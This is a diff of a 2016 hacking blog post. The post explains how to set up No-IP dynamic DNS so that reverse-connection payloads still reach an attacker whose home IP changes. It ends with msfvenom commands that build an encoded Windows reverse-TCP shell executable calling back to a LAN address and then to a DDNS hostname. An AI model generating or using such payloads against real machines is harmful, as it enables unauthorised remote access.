@@ -1,14 +1,10 @@
 ---
-layout: post
-comments: true
 date: 'Sun Mar 06 2016 13:58:02 GMT+0530 (India Standard Time)'
-slug: use-ddns-to-deal-with-your-dynamic-public-ip
 title: Use DDNS to Deal with Your Dynamic Public IP
 tags:
   - Hacking
   - DDNS
   - Metasploit
-published: true
 ---
 
 Many of us have an internet connection with dynamic public IP. That poses some problems if you want to use that connection to host a website, or maybe for hackers like us, to hack using reverse connection payloads. I'm going to discuss in this post how you can overcome that using Dynamic DNS or DDNS. But I'm getting ahead of myself, so let me start by explaining what is public IP and what are some problems you can encounter if you have a dynamic one.
@@ -53,7 +49,7 @@ When you get to the dashboard, go to Dynamic DNS -> Hostnames and add a hostname
 
 Now you'll need to install a program on your computer and set it up. So that it connects to No-IP server frequently and updates the DNS record. Download the update client from https://www.noip.com/download . It's a tar.gz archive, extract it using the following command
 ```console
-tar -xzvf noip-duc-linux.tar.gz
+$ tar -xzvf noip-duc-linux.tar.gz
 ```
 
 ![screenshot-from-2016-12-18-14-24-36](/images/posts/screenshot-from-2016-12-18-14-24-36.png)
@@ -62,7 +58,7 @@ tar -xzvf noip-duc-linux.tar.gz
 After that change working directory to the newly extracted folder and run the following command to install the No-IP client.
 
 ```console
-make install
+$ make install
 ```
 
 ![screenshot-from-2016-12-18-14-38-06](/images/posts/screenshot-from-2016-12-18-14-38-06.png)
@@ -77,13 +73,13 @@ After that the program will ask for your No-IP username and password.
 Run the following command to launch the configuration wizard of the No-IP client. It will ask you for your credentials, as well as which hostnames you want to update. Select the hostname (or hostnames) that you want to associate with this computer in that step.
 
 ```console
-noip2 -C
+$ noip2 -C
 ```
 
 When you are done with the configuration, just run **noip2** in the terminal to start the client, it will run in the background and keep updating your DNS record.
 
 ```console
-noip2
+$ noip2
 ```
 
 ![screenshot-from-2016-12-18-14-49-56](/images/posts/screenshot-from-2016-12-18-14-49-56.png)
@@ -97,13 +93,13 @@ You can create a basic reverse shell payload for windows and get a shell on a re
 Generally we run a command like this to generate the payload. Here LHOST is the address of the our local machine, in the following example it's _192.168.1.101_
 
 ```console
-msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.1.101 LPORT=3333 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
+$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.1.101 LPORT=3333 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
 ```
 
 Now that we have a DDNS hostname, pass that as LHOST to msfvenom instead of your IP. So now the command will be
 
 ```console
-msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=skulltech.ddn.com LPORT=3333 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
+$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=skulltech.ddn.com LPORT=3333 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
 ```
 
 Feel free to leave a comment if you face any problem. Happy Hacking! :)
